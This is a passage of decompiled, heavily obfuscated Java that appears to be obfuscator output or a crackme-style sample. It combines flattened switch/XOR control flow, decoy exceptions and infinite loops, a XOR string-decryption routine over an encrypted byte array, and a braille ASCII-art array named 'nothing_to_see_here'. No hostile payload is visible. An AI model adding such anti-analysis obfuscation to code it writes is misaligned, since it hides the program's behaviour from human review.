                                                         switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                            case 141824170:
                                                               var64 ^= 1279770862;
                                                               break label588;
                                                            case 848749397:
                                                               break;
                                                            case 1631805791:
                                                            default:
                                                               break label780;
                                                            case 1680499100:
                                                               break label588;
                                                         }
                                                      }

                                                      try {
                                                         if (iweepkikjyqovrst.nmnwjialmtrkdahy(var64) != 61998627) {
                                                            throw null;
                                                         }

                                                         throw new IllegalAccessException();
                                                      } catch (IllegalAccessException var57) {
                                                         switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var64)) {
                                                            case 1364379224 -> var64 = 1902186900 ^ var64;
                                                            case 1491502881 -> var64 = 1347918267 ^ var64;
                                                            default -> throw new IOException("Error in hash");
                                                         }
                                                      }

                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -631616773) {
                                                         break label772;
                                                      }

                                                      while(true) {
                                                         switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                            case 249668963:
                                                               var64 ^= 1233551446;
                                                               break label676;
                                                            case 787988928:
                                                               break;
                                                            case 1324223109:
                                                            default:
                                                               do {
                                                                  while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 1274829176) {
                                                                  }
                                                               } while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != (943379855 ^ var64));

                                                               int var76 = 1583368901 ^ var64;
                                                               throw new IllegalAccessException("double");
                                                            case 1650119028:
                                                               break label676;
                                                         }
                                                      }
                                                   case 107928267:
                                                      var64 = 2014026518 ^ var64;
                                                      String var49 = glquaglpxj(dxssodrzavkuckl(), var64);
                                                      StringBuilder var35 = var7.append(var49);
                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -347091263) {
                                                         break label686;
                                                      }

                                                      label673:
                                                      while(true) {
                                                         switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                            case 117270907:
                                                               var64 ^= 1364149712;
                                                               break label673;
                                                            case 662402876:
                                                               break;
                                                            case 702246992:
                                                            default:
                                                               break label687;
                                                            case 1341702408:
                                                               break label673;
                                                         }
                                                      }

                                                      try {
                                                         if (iweepkikjyqovrst.nmnwjialmtrkdahy(var64) != 25911401) {
                                                            throw null;
                                                         }

                                                         throw new IOException();
                                                      } catch (IOException var61) {
                                                         switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var64)) {
                                                            case -2024942856 -> var64 = yvmsnlgcbwwkcori(var64, 1802046450);
                                                            case 1630920771 -> var64 = yvmsnlgcbwwkcori(var64, 396758437);
                                                            default -> throw new RuntimeException("Error in hash");
                                                         }

                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -603615893) {
                                                            do {
                                                               while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -603615893) {
                                                               }
                                                            } while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != (142345914 ^ var64));

                                                            int var75 = 1577825897 ^ var64;
                                                            throw new IOException("double");
                                                         }
                                                      }

                                                      while(true) {
                                                         switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                            case 256451519:
                                                               var64 ^= 1229813924;
                                                               break label676;
                                                            case 343877306:
                                                               break;
                                                            case 1050315153:
                                                            default:
                                                               do {
                                                                  while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 1529462065) {
                                                                  }
                                                               } while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != (202605387 ^ var64));

                                                               int var10000 = 1486130375 ^ var64;
                                                               throw new RuntimeException("double");
                                                            case 1425825582:
                                                               break label676;
                                                         }
                                                      }
                                                   case 107928472:
                                                      var64 = 912031470 ^ var64;
                                                      String var50 = glquaglpxj(pyshkcanohxvawr(), var64);
                                                      StringBuilder var37 = var7.append(var50);
                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -1712267005) {
                                                         break label772;
                                                      }

                                                      label632:
                                                      while(true) {
                                                         switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                            case 256386368:
                                                               var64 ^= 1825611583;
                                                               break label632;
                                                            case 1088755716:
                                                            default:
                                                               break label781;
                                                            case 1831683161:
                                                               break label632;
                                                            case 1994481046:
                                                         }
                                                      }

                                                      try {
                                                         if (iweepkikjyqovrst.nmnwjialmtrkdahy(var64) != 232653282) {
                                                            throw null;
                                                         }

                                                         throw new RuntimeException();
                                                      } catch (RuntimeException var59) {
                                                         switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var64)) {
                                                            case -9168648 -> var64 ^= 2106381648;
                                                            case 1689148745 -> var64 = yvmsnlgcbwwkcori(var64, 1324850662);
                                                            default -> throw new RuntimeException("Error in hash");
                                                         }
                                                      }

                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 319992443) {
                                                         break label694;
                                                      }

                                                      while(true) {
                                                         switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                            case 245294427:
                                                               var64 ^= 1353686854;
                                                               break label676;
                                                            case 974108940:
                                                            default:
                                                               break label714;
                                                            case 1235779192:
                                                               break;
                                                            case 2108674088:
                                                               break label676;
                                                         }
                                                      }
                                                   default:
                                                      var64 = yvmsnlgcbwwkcori(var64, 1875071540);
                                                      byte var45 = (byte)(715206874 ^ var64);
                                                      if (var21 < var45) {
                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 1426687953) {
                                                            while(true) {
                                                               while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -54696366) {
                                                               }

                                                               if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (108853105 ^ var64)) {
                                                                  int var88 = 252222590 ^ var64;
                                                                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == 1426687953 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1662475112 ^ var64)) {
                                                                     var88 = 2099446156 ^ var64;
                                                                     throw new IOException("double");
                                                                  }
                                                               }
                                                            }
                                                         }

                                                         var64 = 1519363539 ^ var64;
                                                         String var46 = glquaglpxj(kqnwowvsfaplszp(), var64);
                                                         byte var4 = (byte)(1882101032 ^ var64);
                                                         Object[] var51 = new Object[var4];
                                                         byte var5 = (byte)(1882101033 ^ var64);
                                                         Integer var52 = var21;
                                                         var51[var5] = var52;
                                                         String var47 = String.format(var46, var51);
                                                         StringBuilder var31 = var7.append(var47);
                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -2123060917) {
                                                            break label771;
                                                         }

                                                         var64 = yvmsnlgcbwwkcori(var64, 1531683471);

                                                         try {
                                                            if (iweepkikjyqovrst.nmnwjialmtrkdahy(var64) != 68432052) {
                                                               throw null;
                                                            }

                                                            throw new IllegalAccessException();
                                                         } catch (IllegalAccessException var62) {
                                                            switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var64)) {
                                                               case -1844502304 -> var64 = 145564488 ^ var64;
                                                               case 1529462065 -> var64 = 831123698 ^ var64;
                                                               default -> throw new RuntimeException("Error in hash");
                                                            }
                                                         }

                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -681166176) {
                                                            break label689;
                                                         }

                                                         var64 = yvmsnlgcbwwkcori(var64, 673255005);
                                                      } else {
                                                         var64 = 439982903 ^ var64;
                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -2067440023) {
                                                            if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -2067440023) {
                                                               do {
                                                                  while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -2067440023) {
                                                                  }
                                                               } while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != (164108197 ^ var64));

                                                               int var96 = 1819357344 ^ var64;
                                                               throw new IllegalAccessException("double");
                                                            }

                                                            while(true) {
                                                               switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                                  case 237501509:
                                                                     var64 ^= 1436312613;
                                                                     break label686;
                                                                  case 468546783:
                                                                     break;
                                                                  case 1398685057:
                                                                  default:
                                                                     break label685;
                                                                  case 1470231061:
                                                                     break label686;
                                                               }
                                                            }
                                                         }

                                                         label599:
                                                         while(true) {
                                                            switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                               case 237501509:
                                                                  var64 ^= 1690487746;
                                                                  break label599;
                                                               case 1106283791:
                                                               default:
                                                                  break label771;
                                                               case 1479735863:
                                                                  break label599;
                                                               case 1932289008:
                                                            }
                                                         }

                                                         var7.append(var21);
                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -1563230086) {
                                                            break label689;
                                                         }

                                                         var64 ^= 1721215238;
                                                      }
                                                }

                                                var10 += 852347144 ^ var64;
                                                if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -1771157431) {
                                                   break label689;
                                                }

                                                var64 = 769464739 ^ var64;

                                                try {
                                                   if (iweepkikjyqovrst.nmnwjialmtrkdahy(var64) != 204507993) {
                                                      throw null;
                                                   }

                                                   throw new IllegalAccessException();
                                                } catch (IllegalAccessException var63) {
                                                   switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var64)) {
                                                      case -125401776 -> var64 = 1418495796 ^ var64;
                                                      case -54696366 -> var64 = yvmsnlgcbwwkcori(var64, 336329556);
                                                      default -> throw new IllegalAccessException("Error in hash");
                                                   }

                                                   if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 1558363378) {
                                                      do {
                                                         while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 1558363378) {
                                                         }
                                                      } while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != (282035394 ^ var64));

                                                      int var90 = 1738370979 ^ var64;
                                                      throw new RuntimeException("double");
                                                   }

                                                   var64 = 457128545 ^ var64;
                                                }
                                             }
                                          }

                                          while(true) {
                                             while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -802029103) {
                                             }

                                             if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1413729777 ^ var64)) {
                                                int var84 = 1075082707 ^ var64;
                                                if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == 201158602 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (618707772 ^ var64)) {
                                                   var84 = 1793518216 ^ var64;
                                                   throw new RuntimeException("double");
                                                }
                                             }
                                          }
                                       }

                                       do {
                                          while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -402820774) {
                                          }
                                       } while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != (267591930 ^ var64));

                                       int var104 = 2024513062 ^ var64;
                                       throw new IOException("double");
                                    }

                                    while(true) {
                                       while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -631616773) {
                                       }

                                       if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (489366263 ^ var64)) {
                                          int var100 = 1223423197 ^ var64;
                                          if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -1712267005 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1598009994 ^ var64)) {
                                             var100 = 749838769 ^ var64;
                                             throw new IOException("double");
                                          }
                                       }
                                    }
                                 }

                                 while(true) {
                                    while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 1449315539) {
                                    }

                                    if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1337081220 ^ var64)) {
                                       int var102 = 1441027861 ^ var64;
                                       if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == 2032131761 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (106408541 ^ var64)) {
                                          var102 = 347422388 ^ var64;
                                          throw new RuntimeException("double");
                                       }
                                    }
                                 }
                              }

                              while(true) {
                                 while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 1197015899) {
                                 }

                                 if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1970267019 ^ var64)) {
                                    int var108 = 1858317731 ^ var64;
                                    if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -2024942856 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1724075368 ^ var64)) {
                                       var108 = 1254816652 ^ var64;
                                       if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -347091263 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (152218150 ^ var64)) {
                                          var108 = 288898388 ^ var64;
                                          throw new RuntimeException();
                                       }
                                    }
                                 }
                              }
                           }

                           do {
                              while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 71262048) {
                              }
                           } while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != (612739314 ^ var64));

                           int var97 = 466817319 ^ var64;
                           throw new RuntimeException("double");
                        }

                        while(true) {
                           while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -1416757415) {
                           }

                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (780401128 ^ var64)) {
                              int var94 = 1140520115 ^ var64;
                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -2123060917 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (385850542 ^ var64)) {
                                 var94 = 85316371 ^ var64;
                                 throw new IllegalAccessException("double");
                              }
                           }
                        }
                     }

                     while(true) {
                        while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -1563230086) {
                        }

                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1146739001 ^ var64)) {
                           int var91 = 46284974 ^ var64;
                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -1771157431 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1926525482 ^ var64)) {
                              var91 = 1688892699 ^ var64;
                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -681166176 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1564708682 ^ var64)) {
                                 var91 = 2146781810 ^ var64;
                                 throw new IOException("double");
                              }
                           }
                        }
                     }
                  }

                  while(true) {
                     while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -9168648) {
                     }

                     if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (6176816 ^ var64)) {
                        int var78 = 1748023066 ^ var64;
                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -1699630237 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (242712362 ^ var64)) {
                           var78 = 920663879 ^ var64;
                           throw new IllegalAccessException("double");
                        }
                     }
                  }
               }

               while(true) {
                  while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -567926191) {
                  }

                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (396894259 ^ var64)) {
                     int var106 = 1005016879 ^ var64;
                     if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -125401776 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (432289947 ^ var64)) {
                        var106 = 243623673 ^ var64;
                        throw new IllegalAccessException("double");
                     }
                  }
               }
            }

            while(true) {
               while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 319992443) {
               }

               if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (2029876390 ^ var64)) {
                  int var82 = 1242807746 ^ var64;
                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == 384343235 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (560477967 ^ var64)) {
                     var82 = 60072310 ^ var64;
                     throw new IllegalAccessException("double");
                  }
               }
            }
         }

         while(true) {
            while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -1004630517) {
            }

            if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1016856755 ^ var64)) {
               int var80 = 321016106 ^ var64;
               if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == 1491502881 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1381193809 ^ var64)) {
                  var80 = 2105307829 ^ var64;
                  throw new IllegalAccessException("double");
               }
            }
         }
      }

      String var39 = var7.toString();
      return var39;
   }

   static {
      nothing_to_see_here[0] = "⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄";
      nothing_to_see_here[1] = "⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄";
      nothing_to_see_here[2] = "⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄";
      nothing_to_see_here[3] = "⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄";
      nothing_to_see_here[4] = "⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰";
      nothing_to_see_here[5] = "⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤";
      nothing_to_see_here[6] = "⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗";
      nothing_to_see_here[7] = "⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄";
      nothing_to_see_here[8] = "⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄";
      nothing_to_see_here[9] = "⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄";
      nothing_to_see_here[10] = "⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄";
      nothing_to_see_here[11] = "⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄";
      nothing_to_see_here[12] = "⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄";
      nothing_to_see_here[13] = "⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴";
      nothing_to_see_here[14] = "⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿";
      iimrcefsos = ByteBuffer.wrap(nfbnudrqqkvayex()).asCharBuffer().toString();
      int var3 = (new Random(-4613565361186434394L)).nextInt();
      qg1UGRR5c9 = -654819786 ^ var3;
   }

   public static String glquaglpxj(byte[] var0, int var1) {
      String var13 = Integer.toString(var1);
      byte[] var14 = var13.getBytes();
      byte[] var8 = var14;
      byte var3 = 0;
      byte var16 = var0[var3];
      short var36 = 255;
      int var17 = var16 & var36;
      byte var37 = 24;
      int var18 = var17 << var37;
      byte var4 = 1;
      byte var39 = var0[var4];
      short var68 = 255;
      int var40 = var39 & var68;
      byte var69 = 16;
      int var41 = var40 << var69;
      int var19 = var18 | var41;
      byte var70 = 2;
      byte var43 = var0[var70];
      short var71 = 255;
      int var44 = var43 & var71;
      byte var72 = 8;
      int var45 = var44 << var72;
      int var20 = var19 | var45;
      byte var73 = 3;
      byte var47 = var0[var73];
      short var74 = 255;
      int var48 = var47 & var74;
      int var21 = var20 | var48;
      byte var49 = 4;
      byte var23 = var0[var49];
      short var50 = 255;
      int var24 = var23 & var50;
      byte var51 = 24;
      int var25 = var24 << var51;
      byte var75 = 5;
      byte var53 = var0[var75];
      short var76 = 255;
      int var54 = var53 & var76;
      byte var77 = 16;
      int var55 = var54 << var77;
      int var26 = var25 | var55;
      byte var78 = 6;
      byte var57 = var0[var78];
      short var79 = 255;
      int var58 = var57 & var79;
      byte var80 = 8;
      int var59 = var58 << var80;
      int var27 = var26 | var59;
      byte var81 = 7;
      byte var61 = var0[var81];
      short var82 = 255;
      int var62 = var61 & var82;
      int var28 = var27 | var62;
      String var29 = iimrcefsos;
      int var84 = var28 + var21;
      String var30 = var29.substring(var28, var84);
      Charset var64 = StandardCharsets.UTF_16BE;
      byte[] var31 = var30.getBytes(var64);
      byte[] var11 = var31;
      byte var32 = 0;
      int var12 = var32;

      while(true) {
         int var66 = var11.length;
         if (var12 >= var66) {
            Charset var89 = StandardCharsets.UTF_16BE;
            String var34 = new String(var11, var89);
            return var34;
         }

         byte var86 = var11[var12];
         int var93 = var8.length;
         int var92 = var12 % var93;
         byte var91 = var8[var92];
         int var87 = var86 ^ var91;
         byte var88 = (byte)var87;
         var11[var12] = var88;
         ++var12;
      }
   }

   private static byte[] ehoyfkuegpvdvho() {
      return new byte[]{0, 0, 0, 35, 0, 0, 0, 0};
   }

   private static byte[] lgiugqrrlofgcvm() {
      return new byte[]{0, 0, 0, 3, 0, 0, 0, 35};
   }

   private static byte[] chuqygnlkcszwut() {
      return new byte[]{0, 0, 0, 9, 0, 0, 0, 38};
   }

   private static byte[] fhmahktrkzpbyjx() {
      return new byte[]{0, 0, 0, 12, 0, 0, 0, 47};
   }

   private static byte[] cbgtgxzlgsobkuf() {
      return new byte[]{0, 0, 0, 9, 0, 0, 0, 59};
   }

   private static byte[] qgzcfqthpzoroxl() {
      return new byte[]{0, 0, 0, 7, 0, 0, 0, 68};
   }

   private static byte[] ttcxuswawjimlng() {
      return new byte[]{0, 0, 0, 14, 0, 0, 0, 75};
   }

   private static byte[] nmjwayviujllddq() {
      return new byte[]{0, 0, 0, 3, 0, 0, 0, 89};
   }

   private static byte[] vbmbffanotsngvo() {
      return new byte[]{0, 0, 0, 3, 0, 0, 0, 92};
   }

   private static byte[] dcczvuqkaxpvoqf() {
      return new byte[]{0, 0, 0, 7, 0, 0, 0, 95};
   }

   private static byte[] qkauvfzrrtwsmro() {
      return new byte[]{0, 0, 0, 34, 0, 0, 0, 102};
   }

   private static byte[] kjyvrvmuzxzcrfk() {
      return new byte[]{0, 0, 0, 15, 0, 0, 0, -120};
   }

   private static byte[] gljbckewxchvnpy() {
      return new byte[]{0, 0, 0, 9, 0, 0, 0, -105};
   }

   private static byte[] hsrbwxzaevizqdb() {
      return new byte[]{0, 0, 0, 10, 0, 0, 0, -96};
   }

   private static byte[] beiwmecgdctlgkh() {
      return new byte[]{0, 0, 0, 29, 0, 0, 0, -86};
   }

   private static byte[] myukervytoyaklr() {
      return new byte[]{0, 0, 0, 3, 0, 0, 0, -57};
   }

   private static byte[] fimypeszmdxrkkx() {
      return new byte[]{0, 0, 0, 8, 0, 0, 0, -54};
   }

   private static byte[] rujbsufvkiiqyby() {
      return new byte[]{0, 0, 0, 4, 0, 0, 0, -46};
   }

   private static byte[] yzumamyedenoigb() {
      return new byte[]{0, 0, 0, 30, 0, 0, 0, -42};
   }

   private static byte[] rwzxbpqowwgeuqi() {
      return new byte[]{0, 0, 0, 2, 0, 0, 0, -12};
   }

   private static byte[] pyshkcanohxvawr() {
      return new byte[]{0, 0, 0, 2, 0, 0, 0, -10};
   }

   private static byte[] zxolcndoghxvldv() {
      return new byte[]{0, 0, 0, 2, 0, 0, 0, -8};
   }

   private static byte[] kqnwowvsfaplszp() {
      return new byte[]{0, 0, 0, 6, 0, 0, 0, -6};
   }

   private static byte[] cefbcmdqcrbsnmp() {
      return new byte[]{0, 0, 0, 0, 0, 0, 1, 0};
   }

   private static byte[] dxssodrzavkuckl() {
      return new byte[]{0, 0, 0, 2, 0, 0, 1, 0};
   }

   private static byte[] aeimrgxkxibdfrx() {
      return new byte[]{0, 0, 0, 2, 0, 0, 1, 2};
   }

   private static byte[] nfbnudrqqkvayex() {
      return new byte[]{49, 113, 54, 91, 50, 87, 57, 94, 52, 82, 49, 81, 54, 64, 50, 80, 57, 94, 52, 80, 49, 18, 54, 64, 50, 86, 57, 16, 52, 67, 49, 87, 54, 88, 50, 92, 57, 93, 52, 82, 49, 70, 54, 70, 50, 64, 57, 16, 52, 82, 49, 92, 54, 80, 50, 73, 57, 95, 52, 94, 49, 92, 54, 64, 50, 23, 57, 30, 52, 25, 57, 84, 57, 89, 52, 91, 57, 92, 57, 81, 52, 67, 48, 89, 55, 78, 54, 23, 48, 81, 53, 72, 56, 82, 56, 124, 55, 123, 50, 118, 52, 112, 56, 124, 55, 117, 50, 101, 52, 97, 56, 116, 55, 117, 50, 97, 52, 112, 56, 125, 55, 93, 50, 86, 52, 67, 56, 95, 55, 71, 50, 90, 52, 87, 56, 68, 56, 103, 55, 93, 50, 91, 52, 85, 56, 95, 55, 67, 50, 70, 56, 126, 55, 64, 50, 101, 52, 67, 56, 95, 55, 82, 50, 92, 52, 93, 56, 85, 55, 125, 50, 91, 52, 85, 56, 85, 55, 76, 55, 20, 49, 85, 56, 70, 57, 122, 52, 108, 57, 125, 54, 71, 51, 86, 53, 92, 53, 91, 48, 89, 50, 68, 56, 91, 49, 107, 57, 82, 55, 91, 51, 80, 54, 82, 49, 77, 57, 93, 55, 90, 51, 91, 54, 81, 49, 24, 57, 83, 55, 82, 51, 86, 54, 93, 49, 95, 57, 67, 55, 92, 51, 64, 54, 88, 49, 92, 57, 17, 55, 71, 51, 84, 54, 69, 49, 83, 57, 17, 55, 67, 51, 90, 54, 89, 49, 84, 57, 31, 55, 29, 51, 27, 49, 91, 57, 91, 55, 89, 57, 28, 55, 85, 49, 81, 57, 86, 55, 89, 57, 93, 55, 93, 49, 22, 57, 121, 55, 85, 57, 91, 55, 87, 49, 83, 54, 85, 56, 70, 50, 82, 51, 25, 49, 81, 54, 91, 56, 93, 50, 86, 54, 110, 54, 68, 50, 68, 57, 80, 53, 65, 49, 88, 55, 28, 52, 85, 49, 90, 54, 86, 54, 98, 51, 83, 50, 65, 53, 78, 51, 95, 49, 80, 54, 87, 51, 21, 56, 65, 54, 84, 51, 81, 50, 90, 53, 75, 51, 66, 49, 65, 54, 83, 51, 65, 56, 90, 54, 94, 51, 88, 50, 19, 53, 91, 51, 89, 49, 94, 54, 66, 51, 89, 56, 86, 54, 69, 51, 83, 55, 85, 50, 91, 54, 88, 55, 93, 50, 83, 54, 64, 52, 83, 53, 25, 55, 87, 50, 78, 54, 81, 52, 89, 56, 64, 52, 93, 56, 91, 49, 96, 50, 86, 51, 85, 55, 90, 57, 66, 49, 70, 50, 86, 51, 64, 55, 90, 57, 95, 49, 85, 50, 19, 51, 87, 55, 69, 57, 84, 49, 92, 50, 71, 51, 18, 55, 95, 57, 88, 49, 65, 50, 71, 51, 87, 55, 93, 57, 84, 49, 64, 50, 64, 51, 28, 55, 29, 57, 31, 49, 108, 57, 76, 49, 101, 51, 111, 49, 109, 56, 67, 49, 100, 56, 71, 49, 21, 49, 0, 51, 7, 49, 64, 49, 108, 51, 18, 49, 101, 51, 91};
   }

   private static int yvmsnlgcbwwkcori(int var0, int var1) {
      return var1 ^ var0;
   }
}
